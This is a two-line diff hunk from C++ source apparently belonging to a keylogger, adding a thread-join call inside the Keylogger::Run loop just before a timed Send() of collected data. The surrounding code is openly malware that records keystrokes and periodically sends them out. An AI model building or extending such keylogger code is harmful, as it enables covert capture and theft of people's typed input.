@@ -48,6 +48,8 @@ void Keylogger::Run()
 	{
 		Sleep(V_IDLE_TIME);
 
+		cmd.JoinThreads();
+
 		if (GetTickCount() - ticksLast >= this->sendInterval)
 		{
 			this->Send();
